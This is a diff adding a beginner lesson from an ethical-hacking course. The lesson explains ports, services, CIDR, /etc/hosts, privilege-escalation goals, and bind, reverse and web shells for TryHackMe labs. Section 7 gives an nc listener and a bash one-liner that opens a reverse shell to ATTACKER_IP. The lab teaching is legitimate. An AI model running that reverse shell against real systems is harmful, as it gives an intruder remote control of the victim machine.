@@ -1,0 +1,121 @@
+# Module 0 — Lesson 3: Networking & Shells Primer
+
+**Why this lesson:** the attack modules talk about ports, services, protocols, subnets, and shells as if you already know them. This lesson gives you just enough of each so those words mean something. It also explains **what a shell and a reverse shell are** — the single most important concept in practical hacking — *before* you meet them in `web/04` and `network/02`, where they otherwise arrive as a cliff.
+
+No prior networking knowledge assumed. Read it once; refer back as needed.
+
+---
+
+## 1. IP addresses — how machines are found
+
+Every machine on a network has an **IP address**, like `10.10.123.45`. It's the machine's "postal address." When you attack a target, you're sending traffic to its IP.
+
+On TryHackMe you deal with two:
+- the **target's** IP (from the room page) — where you send attacks;
+- **your** IP (`ip addr show tun0`) — where the target sends things *back* (reverse shells).
+
+---
+
+## 2. Ports — the doors on a machine
+
+An IP gets you to the machine; a **port** gets you to a specific *service* on it. Think of the IP as a building and ports as numbered doors. A machine has 65,535 ports. A port is **open** if a program is listening on it.
+
+Common doors you'll knock on:
+
+| Port | Service behind it | What it does |
+|---|---|---|
+| 21 | FTP | File transfer |
+| 22 | SSH | Remote Linux login/shell |
+| 80 | HTTP | A website |
+| 443 | HTTPS | A website (encrypted) |
+| 139/445 | SMB | Windows file sharing |
+| 3389 | RDP | Remote Windows desktop |
+| 5985 | WinRM | Remote Windows PowerShell |
+
+**Enumeration** (the first phase of every attack) is largely: *find the open ports, identify the service behind each, and figure out which one lets you in.* That's what `nmap` does in `network/01`.
+
+---
+
+## 3. TCP vs UDP — two ways to talk
+
+- **TCP** — reliable, connection-based (a phone call: both sides confirm they heard each other). Most services (web, SSH, SMB) are TCP.
+- **UDP** — fire-and-forget, no confirmation (a postcard). A few services use it — notably **DNS (53)** and **SNMP (161)**. SNMP over UDP is an easy win people forget, which is why `network/01` scans UDP too.
+
+You don't need the deep theory. Just know: nmap scans TCP by default; you add `-sU` for UDP, and some services only show up there.
+
+---
+
+## 4. Services and versions — why the version matters
+
+A **service** is a program listening on a port (e.g. "Apache" on port 80, "OpenSSH" on 22). Its **version** (e.g. `Apache 2.4.49`) is critical: known versions often have known, public vulnerabilities. "Apache 2.4.49" tells you to search for exploits; "http" alone doesn't. That's why nmap's `-sV` (version detection) is so valuable.
+
+---
+
+## 5. Subnets and CIDR — networks within networks
+
+A **subnet** is a group of IPs that form one local network. You'll see notation like `172.16.5.0/24`. The `/24` is **CIDR** — it means "the first 24 bits are the network part," which in practice = the range `172.16.5.0` to `172.16.5.255` (256 addresses). Loosely: `172.16.5.0/24` means "every machine whose IP starts with `172.16.5.`."
+
+Why you care: in the pivoting lesson (`network/05`) you'll discover the target can reach a *second* subnet your VPN can't. Tools like `nxc smb 172.16.5.0/24` sweep the whole range at once. When you see `x.x.x.0/24`, read it as "this whole little network."
+
+---
+
+## 6. DNS and /etc/hosts — names instead of numbers
+
+**DNS** turns names (`example.com`) into IPs. On labs, the target sometimes expects a name (like `target.thm`) that public DNS doesn't know. You teach your Kali box the mapping by editing `/etc/hosts`:
+```bash
+echo "10.10.123.45 target.thm" | sudo tee -a /etc/hosts
+```
+- `/etc/hosts` is a local file mapping names to IPs. `sudo tee -a` appends a line to it (it's a protected file, hence `sudo`). Now `target.thm` resolves to that IP on your box. Windows/AD attacks especially need this.
+
+---
+
+## 7. What a "shell" is — the core concept
+
+A **shell** is command-line access to a machine. When you have "a shell on the target," you can type commands that run *on the victim*. Getting your first shell on a box is called getting a **foothold**.
+
+There are two directions:
+
+- **Bind shell** — the target opens a port and waits; you connect *to* it. (Less common now; firewalls block incoming connections to victims.)
+- **Reverse shell** — the target connects *back to you*. **This is the standard.** You start a "listener" on your Kali box, then trick the target into connecting out to it, and its command line lands in your terminal.
+
+### Why reverse shells win
+Firewalls usually block connections *into* a machine but allow connections *out*. A reverse shell rides that outbound path, so it works where a bind shell wouldn't.
+
+### How a reverse shell actually goes
+```bash
+# 1. On YOUR Kali box — start a listener that waits for the target:
+nc -lvnp 4444
+```
+- `nc` (netcat) is a general network tool. `-l` listen, `-v` verbose, `-n` no DNS lookups, `-p 4444` on port 4444. Now you're waiting.
+```bash
+# 2. On the TARGET (via a web shell, an exploit, etc.) — make it connect back:
+bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
+```
+- This opens a bash shell on the target and pipes its input/output over a network connection to `ATTACKER_IP` port 4444 — your listener. Its prompt appears in your terminal. You now control the target.
+- `ATTACKER_IP` is your `tun0` address. Grab the exact one-liner for any language/OS from **revshells.com**.
+
+A fresh `nc` shell is clumsy (no arrow keys, Ctrl-C kills it). **Stabilising** it is a short ritual covered in `network/02` §6 — do it every time.
+
+### Web shell vs reverse shell
+A **web shell** is a small malicious page you upload (e.g. `shell.php?cmd=id`) that runs single commands through the browser. It's a foothold, but limited. You almost always *upgrade* a web shell into a proper reverse shell for a real interactive session. You'll see this exact move in `web/04`.
+
+---
+
+## 8. root and SYSTEM — the finish lines
+
+- On **Linux**, the all-powerful admin account is **root**. A normal foothold lands you as a limited user; **privilege escalation** (`network/03`) turns that into root.
+- On **Windows**, the equivalent is **`NT AUTHORITY\SYSTEM`** (usually just "SYSTEM"). `network/04` gets you there.
+- On a **Windows domain**, the ultimate prize is **Domain Admin** — control of the whole network (the Active Directory module).
+
+Whenever a lesson says "get root" or "escalate to SYSTEM," this is the target: from a limited user to total control of that machine.
+
+---
+
+## 9. Carry forward
+
+- IP = which machine; port = which service on it; version = whether it's exploitable. Enumeration is finding all three.
+- `x.x.x.0/24` = a whole small network. `/etc/hosts` maps names to IPs when DNS won't.
+- A **shell** = command access to a machine; a **reverse shell** (target connects back to your `nc` listener) is the standard way to get one; a **web shell** is a limited foothold you upgrade.
+- The goals: **root** (Linux), **SYSTEM** (Windows), **Domain Admin** (AD network).
+
+**Next lesson:** `labs/04-methodology-and-notes.md` — the phase-by-phase method you'll follow on every box, and how to take notes that become your exam report.
